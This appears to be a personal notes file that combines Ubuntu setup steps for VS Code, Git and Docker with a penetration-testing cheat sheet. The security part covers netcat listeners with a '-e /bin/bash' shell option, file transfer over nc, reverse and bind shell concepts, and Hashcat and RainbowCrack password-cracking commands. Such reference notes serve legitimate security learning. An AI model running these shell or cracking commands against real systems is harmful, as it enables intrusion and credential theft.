table of contents


# Installing Visual Studio Code

Download the .deb package here
https://go.microsoft.com/fwlink/?LinkID=760868

Install it with
sudo apt install ./"filename".deb

Then you can launch it from the apps manager of ubuntu (Windows key) or running "code" in the cli


# Installing Git

sudo apt install git-all


# Installing Docker

First, uninstall any default or old versions

sudo apt-get remove docker docker-engine docker.io containerd runc

Then

sudo apt-get update
sudo apt-get install \
    ca-certificates \
    curl \
    gnupg \
    lsb-release

Adding Dockers GPG key

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

Add the Docker packages repository to apt sources.list

echo \
    "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
    $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

Finally, install Docker engine

sudo apt-get update
sudo apt-get install docker-ce docker-ce-cli containerd.io

# Running The Project

Simply run "docker-compose up -d" in the project root

# Github Actions

Simply go to your repository settings, then actions tab and add a new self-hosted runner.

https://docs.github.com/es/actions/learn-github-actions/workflow-syntax-for-github-actions


# CVEDetails

https://www.cvedetails.com/


# Netcat

**Creates the simplest listener/server -> client connection**

listener:

nc –lvp 4444

client:

nc "server ip" 4444 (To specify shell, –e /bin/bash)



Transfer file

server
cat file.zip | nc -lvp 1234

client
netcat "server ip" 1234 > file.zip

or:

server
nc "client ip" 1234 < file.zip

client
nc -lvp 1234 > file.zip


Test port status

nc -zv "host" "port"

## Reverse Shell

- Listener runs on the attacker
- Noone else can connect to the target
- Relies on egress traffic (Usually egress ports like 80 or 443 are open)
- No need of NAT/PAT

## Bind Shell

- Listener runs on the target
- Relies on ingress traffic (Usually ingress ports are closed)
- Requires NAT/PAT (The private port could be mapped to a different public port)

**Remember: Ports Under 1024 are privileged**

# HaveIbeenPwned

https://haveibeenpwned.com/


# Seclists

The repository can be found here

https://github.com/danielmiessler/SecLists

Simply follow the instructions and unzip it in a directory you like

# Burp

Download from here https://portswigger.net/burp/releases/professional-community-2021-10-2?requestededition=community

# FFUF

The project can be found here

https://github.com/ffuf/ffuf

Grab a release file (compiled bin) for your OS and run it

There's a handy cheatsheet that will help you using it

https://cheatsheet.haax.fr/web-pentest/tools/ffuf/

# HTTP Status Codes

https://thecontentworks.uk/http-status-codes-cheat-sheet/


# Hashcat

Download from here https://hashcat.net/hashcat/

Basic examples

Attack-          | Hash- |
Mode             | Type  | Example command
==================+=======+==================================================================
Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict

# RainbowCrack

Download from here https://project-rainbowcrack.com/index.htm

Generating md5 rainbow chains for passwords using the charset [a-z,0-9] with lenght between 1 and 7 characters

rtgen md5 loweralpha-numeric 1 7 0 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 1 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 2 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 3 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 4 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 5 3800 33554432 0

Now generate the rainbow table (Array of rainbow chains)

rtsort .

Finally crack some hashes

rcrack "path to rainbow tables dir" -l "hash list file"

